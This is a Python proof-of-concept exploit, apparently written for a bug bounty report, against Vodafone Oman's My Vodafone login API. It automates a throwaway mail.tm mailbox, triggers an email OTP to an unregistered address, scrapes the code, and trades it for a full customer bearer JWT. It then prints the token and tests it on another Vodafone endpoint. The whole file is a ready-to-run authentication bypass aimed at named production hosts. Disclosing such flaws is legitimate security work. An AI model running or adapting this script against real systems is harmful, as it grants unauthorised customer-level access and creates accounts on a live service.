#!/usr/bin/env python3
"""
PoC — Vodafone Oman My Vodafone (MVA): anonymous customer account creation
via email-OTP login with an unregistered email address.

Target : https://vfo01.vodafone.om  (ZenAuthNext SGW, in scope)
Side FX: issues a full customer Bearer JWT (scope "customers"), accepted by
         vfo02 (ZDS) and vfo03 (Chat). A throwaway mailbox is auto-created
         on api.mail.tm — no credentials required.

Run    : python3 poc.py            (Python 3.9+, stdlib only)
Safe   : standard app login traffic, disposable mailbox, read-only checks.
"""
import base64, hashlib, json, re, string, sys, time, uuid
import urllib.error, urllib.parse, urllib.request

UA = ("Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Version/4.0 Chrome/120.0 Mobile Safari/537.36 h1.recon")  # <- your H1 UA

def http_json(url, data=None, token=None, method=None, ctype="application/json", timeout=40):
    h = {"User-Agent": "h1.recon-poc/1.0"}
    if data is not None:
        h["Content-Type"] = ctype
        body = data.encode() if isinstance(data, str) else json.dumps(data).encode()
    else:
        body = None
    if token:
        h["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, data=body, headers=h, method=method or ("POST" if body else "GET"))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def vfo(path, body, ctype="application/json"):
    """SGW endpoint with the app's mandatory header set."""
    h = {
        "User-Agent": UA, "Accept": "application/json", "Content-Type": ctype,
        "X-Application-ID": "MVA_ANDROID", "X-Request-ID": str(uuid.uuid4()),
        "X-Correlation-ID": str(uuid.uuid4()),
        "Zen-Application": "MVA", "Zen-OS": "android", "Zen-AppVersion": "5.2.2",
    }
    data = body.encode() if isinstance(body, str) else json.dumps(body).encode()
    req = urllib.request.Request("https://vfo01.vodafone.om" + path, data=data, headers=h, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=40) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

# ---------------------------------------------------------------- step 0 ----
# disposable mailbox (api.mail.tm) so the OTP email can be read programmatically
def make_mailbox():
    st, doms = http_json("https://api.mail.tm/domains")
    domain = [d["domain"] for d in json.loads(doms)["hydra:member"] if d["isActive"]][0]
    addr = ("h1poc" + "".join(uuid.uuid4().hex[:6]) + "@" + domain)
    pw = "Poc!" + "".join(uuid.uuid4().hex[:12])
    st, _ = http_json("https://api.mail.tm/accounts", {"address": addr, "password": pw})
    if st != 201:
        print("mailbox create failed:", st); sys.exit(1)
    st, tk = http_json("https://api.mail.tm/token", {"address": addr, "password": pw})
    addr = json.loads(tk)["account"]["address"] if "account" in json.loads(tk) else addr
    return addr, json.loads(tk)["token"]

def wait_otp(mtoken, known):
    deadline = time.time() + 180
    while time.time() < deadline:
        st, msgs = http_json("https://api.mail.tm/messages", token=mtoken)
        for m in json.loads(msgs).get("hydra:member", []):
            if m["id"] in known:
                continue
            st, full = http_json("https://api.mail.tm/messages/" + m["id"], token=mtoken)
            html = json.loads(full).get("html") or ""
            if isinstance(html, list):
                html = "\n".join(p.get("content", "") if isinstance(p, dict) else str(p) for p in html)
            mt = re.search(r"confirmActivationEmail\?otpCode=(\d{4})", html)
            if mt:
                return mt.group(1)
        time.sleep(5)
    return None

def main():
    print("[*] step 0: disposable mailbox on api.mail.tm")
    email, mtoken = make_mailbox()
    print("    mailbox:", email)
    st, msgs = http_json("https://api.mail.tm/messages", token=mtoken)
    known = {m["id"] for m in json.loads(msgs).get("hydra:member", [])}

    print("[*] step 1: loginStart (PKCE)")
    verifier = (b64u(uuid.uuid4().bytes) + b64u(uuid.uuid4().bytes))[:64]
    challenge = b64u(hashlib.sha256(verifier.encode()).digest())
    st, b = vfo("/auth/api/public/login/v1/start",
                {"clientId": "MVA", "responseType": "code", "scope": "openid",
                 "codeChallengeMethod": "S256", "codeChallenge": challenge,
                 "state": str(uuid.uuid4())})
    j = json.loads(b)
    email_sp = j["nextStep"]["emailOtpMethod"]["secretPayload"]
    tmp = j["temporaryAccessToken"]
    print("    ok, temporaryAccessToken:", tmp[:24] + "...")

    print("[*] step 2: authenticate(resend=true) — trigger OTP to the UNREGISTERED mailbox")
    st, b = vfo("/auth/api/public/login/v1/authenticate",
                {"authToken": {"emailOtpToken": {"secretPayload": email_sp, "email": email,
                                                 "otp": None, "resend": True}},
                 "temporaryAccessToken": tmp})
    j2 = json.loads(b)
    m = j2.get("nextStep", {}).get("emailOtpMethod", {})
    print("    server accepted it -> attemptsLeft=%s expiresIn=%ss resendIn=%ss"
          % (m.get("otpAttemptsLeft"), m.get("otpExpiresIn"), m.get("otpResendIn")))
    tmp, email_sp = j2["temporaryAccessToken"], m["secretPayload"]

    print("[*] step 3: wait for OTP email (4-digit code embedded in link)")
    otp = wait_otp(mtoken, known)
    if not otp:
        print("    FAILED: no OTP email within 180s"); sys.exit(1)
    print("    OTP:", otp)

    print("[*] step 4: authenticate(otp=%s)" % otp)
    st, b = vfo("/auth/api/public/login/v1/authenticate",
                {"authToken": {"emailOtpToken": {"secretPayload": email_sp, "email": email,
                                                 "otp": otp, "resend": False}},
                 "temporaryAccessToken": tmp})
    code = re.search(r"code=([A-Za-z0-9_\-]+)", b).group(1)
    print("    auth code:", code)

    print("[*] step 5: access-token (authorization_code grant)")
    st, b = vfo("/auth/api/public/access-token/v1",
                urllib.parse.urlencode({"client_id": "MVA", "scope": "openid",
                                        "code_verifier": verifier, "code": code,
                                        "grant_type": "authorization_code"}),
                ctype="application/x-www-form-urlencoded")
    tok = json.loads(b)["access_token"]
    print("    FULL CUSTOMER BEARER JWT:\n    " + tok)

    claims = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))
    print("\n[+] JWT claims:")
    print(json.dumps(claims, indent=2))

    print("\n[*] step 6: validate token (vfo03 chat, in scope)")
    h = {"User-Agent": UA, "Authorization": "Bearer " + tok, "Accept": "application/json",
         "X-Application-ID": "MVA_ANDROID", "X-Request-ID": str(uuid.uuid4()),
         "X-Correlation-ID": str(uuid.uuid4()), "Zen-Application": "MVA",
         "Zen-OS": "android", "Zen-AppVersion": "5.2.2"}
    for url, tok_h in [("https://vfo03.vodafone.om/chat/customer/v1/agents/availability", h),
                       ("https://vfo03.vodafone.om/chat/customer/v1/agents/availability",
                        {k: v for k, v in h.items() if k != "Authorization"})]:
        r = urllib.request.Request(url, headers=tok_h)
        try:
            with urllib.request.urlopen(r, timeout=30) as x:
                print("    GET", url, "->", x.status, x.read().decode())
        except urllib.error.HTTPError as e:
            print("    GET", url, "->", e.code, e.read().decode())
    print("\n[+] Done. Re-run with the SAME mailbox to see the same customer_id persist (account created).")

if __name__ == "__main__":
    main()
